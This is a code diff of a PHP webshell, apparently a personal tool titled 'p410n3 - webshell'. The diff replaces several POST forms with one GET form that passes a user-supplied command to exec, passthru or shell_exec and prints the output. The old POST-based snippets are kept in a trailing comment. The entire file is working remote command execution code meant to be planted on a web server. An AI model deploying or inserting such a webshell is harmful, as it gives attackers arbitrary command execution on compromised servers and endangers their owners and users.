@@ -1,66 +1,106 @@
-<html>
-
+<!doctype html>
+<html lang="en">
 <head>
-    <title>_palonE webshell</title>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>p410n3 - webshell</title>
+    <style>
+        body {
+            font-family: Consolas;
+        }
+
+        .container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .form {
+            margin-top: 50px;
+
+            display: flex;
+            justify-content: center;
+        }
+
+        .code {
+            margin-top: 30px;
+            background-color: black;
+            color: green;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 15px;
+        }
+    </style>
+
 </head>
 <body>
-    <div>
-        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
-            <label for="passthru">passthru</label>
-            <input type="text" name="passthru_cmd" placeholder="passthru" id="passthru">
-            <input type="submit">
-        </form>
+    <div class="container">
+        <div class="form">
+            <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="get">
 
-        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
-            <label for="system">system</label>
-            <input type="text" name="system_cmd" placeholder="system" id="system">
-            <input type="submit">
-        </form>
+                <label for="executioner">Command: </label>
+                <select name="executioner" id="executioner">
+                    <option value="exec">exec</option>
+                    <option value="passthru">passthru</option>
+                    <option value="shell_exec">shell_exec</option>
+                    <option value="system">system</option>
+                    <option value="popen">popen (live!)</option>
+                </select>
 
-        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
-            <label for="shell_exec">shell_exec</label>
-            <input type="text" name="shell_exec_cmd" placeholder="shell_exec" id="shell_exec">
-            <input type="submit">
-        </form>
+                <input type="text" name="cmd" placeholder="cmd" id="cmd">
+                <button type="submit">RUN</button>
+            </form>
+        </div>
+        <div class="code">
+            <pre>
+            <?php
+                if (isset($_GET["executioner"]) && isset($_GET["cmd"])) {
+                    $exec = $_GET["executioner"];
+                    $cmd = $_GET["cmd"];
 
-        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
-            <label for="popen_cmd">popen</label>
-            <input type="text" name="popen_cmd" placeholder="popen_cmd" id="popen_cmd">
-            <input type="submit">
-        </form>
+                    switch ($exec) {
+                        case "exec":
+                            exec($cmd, $out);
+                            print_r($out);
+                            break;
 
-        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
-            <label for="exec">exec</label>
-            <input type="text" name="exec_cmd" placeholder="exec" id="exec">
-            <input type="submit">
-        </form>
+                        case "passthru":
+                            passthru($cmd);
+                            break;
+
+                        case "shell_exec":
+                            echo shell_exec($cmd);
+                            break;
+                    }
+
+                }
+            ?>
+            </pre>
+        </div>
     </div>
 
-    <pre style="white-space: pre-line;">
-        <?php
-
-            if (isset($_POST['passthru_cmd'])) {
-                passthru($_POST['passthru_cmd']);
-            } else if (isset($_POST['system_cmd'])) {
-                passthru($_POST['system_cmd']);
-            } else if (isset($_POST['shell_exec_cmd'])) {
-                passthru($_POST['shell_exec_cmd']);
-            } else if (isset($_POST['popen_cmd'])) {
-                //start command and output console
-                $proc = popen($_POST['popen_cmd'], 'r');
-                while (!feof($proc)) {
-                    echo fread($proc, 4096);
-                    @ flush();
-                }
-                pclose($proc);
-            } else if (isset($_POST['exec_cmd'])) {
-                exec($_POST['exec_cmd'], $out);
-                print_r($out);
-            }
-
-        ?>
-    </pre>
 
 </body>
-
 </html>
+<?php
+//notes
+/*
+passthru($_POST['passthru_cmd']);
+
+system($_POST['system_cmd']);
+
+echo shell_exec($_POST['shell_exec_cmd']);
+
+//start command and output console
+$proc = popen($_POST['popen_cmd'], 'r');
+while (!feof($proc)) {
+echo fread($proc, 4096);
+@ flush();
+}
+pclose($proc);
+
+exec($_POST['exec_cmd'], $out);
+print_r($out); */
